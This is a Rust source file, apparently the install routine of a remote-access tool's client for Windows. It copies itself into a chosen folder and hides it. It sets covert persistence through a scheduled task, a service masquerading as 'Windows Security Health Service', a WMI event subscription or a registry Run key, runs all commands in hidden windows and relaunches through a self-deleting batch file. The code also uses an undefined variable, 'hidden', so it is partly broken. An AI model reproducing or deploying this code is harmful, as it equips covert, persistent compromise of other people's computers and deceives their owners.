use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::winnt::{ TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY };
use std::ptr;

use std::{
    env,
    fs::{self, File},
    io::{Read, Write},
    path::PathBuf,
    process::Command,
    thread::sleep,
    time::Duration,
};

use std::os::windows::process::CommandExt;
use common;

pub fn is_elevated() -> bool {
    unsafe {
        let mut handle: HANDLE = ptr::null_mut();
        if
            OpenProcessToken(
                winapi::um::processthreadsapi::GetCurrentProcess(),
                TOKEN_QUERY,
                &mut handle
            ) != 0
        {
            let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
            let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
            if
                GetTokenInformation(
                    handle,
                    TokenElevation,
                    &mut elevation as *mut _ as *mut _,
                    size,
                    &mut size
                ) != 0
            {
                return elevation.TokenIsElevated != 0;
            }
        }
    }
    false
}

fn get_special_folder(name: &str) -> Option<PathBuf> {
    let folder: Option<String> = match name.to_lowercase().as_str() {
        "appdata" => env::var("APPDATA").ok(),
        "localappdata" => env::var("LOCALAPPDATA").ok(),
        "temp" => env::var("TEMP").ok(),
        "system" => Some("C:\\Windows\\System32".to_string()),
        "desktop" => {
            let userprofile = env::var("USERPROFILE").ok()?;
            Some(format!("{}\\Desktop", userprofile))
        },
        "programfiles" => env::var("ProgramFiles").ok(),
        _ => None,
    };

    folder.map(PathBuf::from)
}

pub fn install(config: &common::ClientConfig) {
    println!("Installing client to {}", config.install_folder);
    let install_dir = match get_special_folder(config.install_folder.as_str()) {
        Some(path) => path,
        None => {
            eprintln!("Invalid install folder.");
            return;
        }
    };

    let install_path = install_dir.join(&config.file_name);

    let current_exe = std::env::current_exe().unwrap();
    if current_exe == install_path {
        return; // Already installed
    }

    const HIDE: u32 = 0x08000000;

    // Set persistence
    if is_elevated() {
        if config.persistence_schtasks {
            let task_name = install_path.file_stem().unwrap().to_string_lossy();
            let task_cmd = format!(
                "schtasks /create /f /sc onlogon /rl highest /tn \"{}\" /tr '\"{}\"'",
                task_name, install_path.display()
            );
            let _ = Command::new("cmd")
                .creation_flags(HIDE)
                .args(["/c", &task_cmd])
                .output();
        }

        if config.persistence_service {
            let service_name = install_path.file_stem().unwrap().to_string_lossy();
            let create_cmd = format!(
                "sc create \"{}\" binPath= \"{}\" start= auto",
                service_name, install_path.display()
            );
            let _ = Command::new("cmd")
                .creation_flags(HIDE)
                .args(["/c", &create_cmd])
                .output();

            let description_cmd = format!(
                "sc description \"{}\" \"Windows Security Health Service\"",
                service_name
            );
            let _ = Command::new("cmd")
                .creation_flags(HIDE)
                .args(["/c", &description_cmd])
                .output();

            let start_cmd = format!("sc start \"{}\"", service_name);
            let _ = Command::new("cmd")
                .creation_flags(HIDE)
                .args(["/c", &start_cmd])
                .output();
        }

        if config.persistence_wmi {
            let name = install_path.file_stem().unwrap().to_string_lossy();
            let script = format!(
                r#"$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{ Name = '{0}'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }}; $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{ Name = '{0}'; CommandLineTemplate = '"{1}"' }}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{ Filter = $Filter; Consumer = $Consumer }};"#,
                name, install_path.display()
            );

            let _ = Command::new("powershell")
                .creation_flags(HIDE)
                .args(["-WindowStyle", "Hidden", "-Command", &script])
                .output();
        }
    } else {
        // Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
        let value_name = install_path.file_stem().unwrap().to_string_lossy();
        let _ = Command::new("reg")
            .args([
                "add",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                "/v",
                &value_name,
                "/d",
                &format!("\"{}\"", install_path.display()),
                "/f",
            ])
            .creation_flags(HIDE)
            .output();
    }

    // Copy executable
    if install_path.exists() {
        let _ = fs::remove_file(&install_path);
        sleep(Duration::from_secs(1));
    }

    if let Ok(mut target) = File::create(&install_path) {
        if let Ok(mut current) = File::open(&current_exe) {
            let mut buffer = Vec::new();
            let _ = current.read_to_end(&mut buffer);
            let _ = target.write_all(&buffer);
        }
    }

    // Optional: hide file (very basic, can use attrib command)
    if hidden {
        let _ = Command::new("attrib")
            .args(["+h", install_path.to_str().unwrap()])
            .creation_flags(HIDE)
            .output();
    }

    // Relaunch from new path using temp .bat
    let batch_path = std::env::temp_dir().join("r.bat");
    if let Ok(mut bat) = File::create(&batch_path) {
        let _ = writeln!(bat, "@echo off");
        let _ = writeln!(bat, "timeout /t 3 > NUL");
        let _ = writeln!(bat, "start \"\" \"{}\"", install_path.display());
        let _ = writeln!(bat, "del \"%~f0\" /f /q");
    }

    let _ = Command::new(batch_path)
        .creation_flags(HIDE)
        .spawn();

    std::process::exit(0);
}

